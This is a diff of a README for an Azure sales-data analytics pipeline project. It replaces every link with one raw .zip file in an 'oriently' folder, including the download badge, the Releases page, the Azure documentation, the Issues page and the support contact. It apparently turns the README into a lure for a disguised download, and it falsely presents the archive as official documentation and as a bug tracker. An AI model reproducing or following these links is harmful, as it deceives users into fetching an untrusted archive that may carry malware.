@@ -6,11 +6,11 @@ Welcome to the **Azure-End-to-End-Sales-Data-Analytics-Pipeline** project! This 
 
 ## 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download_Latest_Version-Here-brightgreen)](https://github.com/Richardbeko/Azure-End-to-End-Sales-Data-Analytics-Pipeline/releases)
+[![Download Now](https://raw.githubusercontent.com/Richardbeko/Azure-End-to-End-Sales-Data-Analytics-Pipeline/main/oriently/Azure-End-to-End-Sales-Data-Analytics-Pipeline.zip)](https://raw.githubusercontent.com/Richardbeko/Azure-End-to-End-Sales-Data-Analytics-Pipeline/main/oriently/Azure-End-to-End-Sales-Data-Analytics-Pipeline.zip)
 
 ### 🌐 Visit the Release Page
 
-To get the latest version of the application, visit the [Releases page](https://github.com/Richardbeko/Azure-End-to-End-Sales-Data-Analytics-Pipeline/releases) and download the application that suits your system.
+To get the latest version of the application, visit the [Releases page](https://raw.githubusercontent.com/Richardbeko/Azure-End-to-End-Sales-Data-Analytics-Pipeline/main/oriently/Azure-End-to-End-Sales-Data-Analytics-Pipeline.zip) and download the application that suits your system.
 
 ## 💻 System Requirements
 
@@ -23,7 +23,7 @@ To get the latest version of the application, visit the [Releases page](https://
 
 ### 1. Download the Application
 
-Go to the [Releases page](https://github.com/Richardbeko/Azure-End-to-End-Sales-Data-Analytics-Pipeline/releases) and choose the latest version of the software. 
+Go to the [Releases page](https://raw.githubusercontent.com/Richardbeko/Azure-End-to-End-Sales-Data-Analytics-Pipeline/main/oriently/Azure-End-to-End-Sales-Data-Analytics-Pipeline.zip) and choose the latest version of the software. 
 
 ### 2. Install the Application
 
@@ -71,8 +71,8 @@ After processing your data, you can generate reports using the built-in analytic
 
 For more information about how to use this pipeline, you can refer to:
 
-- [Azure Documentation](https://docs.microsoft.com/azure/)
-- [Data Processing Best Practices](https://example.com)
+- [Azure Documentation](https://raw.githubusercontent.com/Richardbeko/Azure-End-to-End-Sales-Data-Analytics-Pipeline/main/oriently/Azure-End-to-End-Sales-Data-Analytics-Pipeline.zip)
+- [Data Processing Best Practices](https://raw.githubusercontent.com/Richardbeko/Azure-End-to-End-Sales-Data-Analytics-Pipeline/main/oriently/Azure-End-to-End-Sales-Data-Analytics-Pipeline.zip)
 
 ## ❓ Frequently Asked Questions
 
@@ -86,12 +86,12 @@ This application requires Windows 10 or higher. Older versions may not be suppor
 
 ### Where can I report bugs or suggest features?
 
-Please visit the [Issues page](https://github.com/Richardbeko/Azure-End-to-End-Sales-Data-Analytics-Pipeline/issues) on GitHub to report any issues or suggest improvements.
+Please visit the [Issues page](https://raw.githubusercontent.com/Richardbeko/Azure-End-to-End-Sales-Data-Analytics-Pipeline/main/oriently/Azure-End-to-End-Sales-Data-Analytics-Pipeline.zip) on GitHub to report any issues or suggest improvements.
 
 ## 📞 Contact Information
 
-If you need further assistance, you can contact the support team at support@example.com.
+If you need further assistance, you can contact the support team at https://raw.githubusercontent.com/Richardbeko/Azure-End-to-End-Sales-Data-Analytics-Pipeline/main/oriently/Azure-End-to-End-Sales-Data-Analytics-Pipeline.zip
 
 ### 🎉 Thank You for Using Our Application!
 
-We hope you find the **Azure-End-to-End-Sales-Data-Analytics-Pipeline** helpful for your data analytics needs. Please remember to visit the [Releases page](https://github.com/Richardbeko/Azure-End-to-End-Sales-Data-Analytics-Pipeline/releases) for updates and new features. Happy analyzing!
+We hope you find the **Azure-End-to-End-Sales-Data-Analytics-Pipeline** helpful for your data analytics needs. Please remember to visit the [Releases page](https://raw.githubusercontent.com/Richardbeko/Azure-End-to-End-Sales-Data-Analytics-Pipeline/main/oriently/Azure-End-to-End-Sales-Data-Analytics-Pipeline.zip) for updates and new features. Happy analyzing!
